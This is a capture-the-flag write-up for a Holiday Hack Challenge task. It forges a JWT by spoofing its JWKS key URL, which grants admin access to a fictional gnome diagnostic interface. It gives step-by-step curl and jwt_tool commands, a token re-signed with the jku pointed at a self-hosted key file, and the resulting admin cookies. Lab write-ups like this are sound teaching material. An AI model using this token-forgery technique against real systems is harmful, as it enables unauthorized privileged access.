# TASK 15 - Rogue Gnome Identity Provider
Difficulty: ❄️❄️

[Direct Link](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termRogueGnome)

## OBJECTIVE : ##
>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?


## HINTS: ##
<details>
  <summary>Hints provided for Task 15</summary>
  
>-	If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www
>-  https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.
>-  It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.

</details>
 
#

## PROCEDURE : ##

Paul Beckett tells us that he has access to Gnome's Diagnostic Interface at `gnome-48371.atnascorp` with the low-privelege account credentials `gnome:SittingOnAShelf`, and that we need to find a way to get admin access to see what the gnomes are up to.

Upon accessing the terminal we find a handy document inside the `home` directory called `notes`.  The document has some useful examples of how to call gnome-48371.atnascorp from the CLI, how to pass the login credentials, how to pass an authenticaiton token and how to pass a cookie.  The document also tells us that the local machine is runnign a webserver with the html files served from `~/www`.  Finally the `notes` document tells us how to analyse a JWT with `jwt_tool.py`.

First, let's try some of the commands found inside the `notes`:

```bash
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q</a>. If not, click the link.
```

This gives us a token with the value `eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q`

We can try passing on this token now:
```bash
paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
...
...
...
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aR2quw.v4RpvefHyroqQqTVBAV652uP0WQ; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Great - we now have a session cookie, which we can use to log in by passing on it's value in the header:
```bash
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aR2quw.v4RpvefHyroqQqTVBAV652uP0WQ' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome gnome</p><p>Diagnostic access is only available to admins.</p>

</body>
```

As expected - we cannot get any further since diagnostic access is only available to admins.  There must be some way of altering the JWT token we were given earlier to get a session cookie for an admin login.

Conveniently the terminal comes with `jwt_tool.py` already installed.  We can pass on the value of the JWT token we found earlier to `jwt_tool.py` to analyse it (Alternatively you can also use an online tool like [jwt.io](jwt.io))

I created an environment variable called `$TOKEN` that contains the value of the JWT to make things a bit more manageable and readable:
```bash
paul@paulweb:~$ TOKEN=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q
```

```bash
paul@paulweb:~$ jwt_tool.py $TOKEN

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] jku = "http://idp.atnascorp/.well-known/jwks.json"
[+] kid = "idp-key-2025"
[+] typ = "JWT"

Token payload values:
[+] sub = "gnome"
[+] iat = 1763551838    ==> TIMESTAMP = 2025-11-19 11:30:38 (UTC)
[+] exp = 1763559038    ==> TIMESTAMP = 2025-11-19 13:30:38 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = False
```

This output is already very interesting.  Clearly, our end goal should be to change the value of `admin` from `False` to `True`.  However the token is signed using a RS256 key pair, so we'll need to find a way of signing the token once we modify it.

We can also see that the token's `jku` parameter points to a `jwks.json` file that contains the public key.

Based on the hints for this task and some background reading, our strategy now is to:
1.  Generate our own `jwks.json` file with our public key
2.  Host the `jwks.json` on our web server
3.  Craft a new token with the modified `admin` parameter and a `jku` paramter pointing to the `jwks.json` file we created,
4.  Sign it with our own private key


To do this we can use the public/private key pairs generated by `jwt_tool.py` on first run that are found in `~/.jwt_tool/`.  We'll use the RSA key pair since the original JWT is signed using RSA-256.  These are: `jwttool_custom_private_RSA.pem` and `jwttool_custom_public_RSA.pem`.

Next, we can copy the sample jwks file from `~/.jwt_tool/jwttool_custom_jwks.jsom` and replace it's contents with the output of a [JWK Generator](https://www.authgear.com/tools/jwk-generator), making sure to keep everything nested within the `"keys":[` segment.  We then save the file as `custom-jwks.json` in the `~/www` folder, thus making it accessible over the internet at `http://paulweb.neighborhood/custom-jwks.json`


<img width="1258" height="794" alt="image" src="https://github.com/user-attachments/assets/51709adc-f0c9-4028-9906-871710214daa" />


Now we can go ahead and use `jwt_tool` in interactive mode to update the token values and to sign the resulting token with RSA 256:

```bash
   paul@paulweb:~$ jwt_tool.py -T $TOKEN -S rs256


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

...
...
...
Current value of jku is: http://idp.atnascorp/.well-known/jwks.json
Please enter new value and hit ENTER
> http://paulweb.neighborhood/custom-jwks.json
[1] alg = "RS256"
[2] jku = "http://paulweb.neighborhood/custom-jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

...
...
...
Current value of admin is: False
Please enter new value and hit ENTER
> True
[1] sub = "gnome"
[2] iat = 1763558897    ==> TIMESTAMP = 2025-11-19 13:28:17 (UTC)
[3] exp = 1763566097    ==> TIMESTAMP = 2025-11-19 15:28:17 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = True
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_3d3a37d3cb702277e6dded5f4b7989b2 - Tampered token - RSA Signing:
[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ
```
Now we have the new JWT token with `admin` set to `True` and with `jku` pointing to our newly-crafted `custom-jwks.json` file.  Same as earlier, I assigned this to the environment variable `$NEWTOKEN`.

Now we can use this to generate a new `session` cookie by calling `http://gnome-48371.atnascorp/auth` with the new JWT:
```bash
paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=$NEWTOKEN
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
...
...
...
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3UGQ.IKBsh1vLJH9lJHUEjPBwCpAz-B4; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Excellent!  We've now got our new `session` cookie that should hopefully grant us admin access to the Diagnostic Interface: `session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3UGQ.IKBsh1vLJH9lJHUEjPBwCpAz-B4`

Let's try passing it in our header:
```bash
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3WQg.4rlv-ZRlOiX5bZMJscURH-lfjww' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-11-19 04:53:07: Movement detected.<br/>
2025-11-19 13:21:18: AtnasCorp C&C connection restored.<br/>
2025-11-19 14:31:53: Checking for updates.<br/>
2025-11-19 14:31:53: Firmware Update available: refrigeration-botnet.bin<br/>
2025-11-19 14:31:55: Firmware update downloaded.<br/>
2025-11-19 14:31:55: Gnome will reboot to apply firmware update in one 
...
...
...
```

<img width="847" height="448" alt="image" src="https://github.com/user-attachments/assets/df832d1a-6864-4f2b-9fb8-dd0337c8d252" />

And there it is - we can see quite clearly that the gnomes downloaded a firmware file called `refrigeration-botnet.bin`
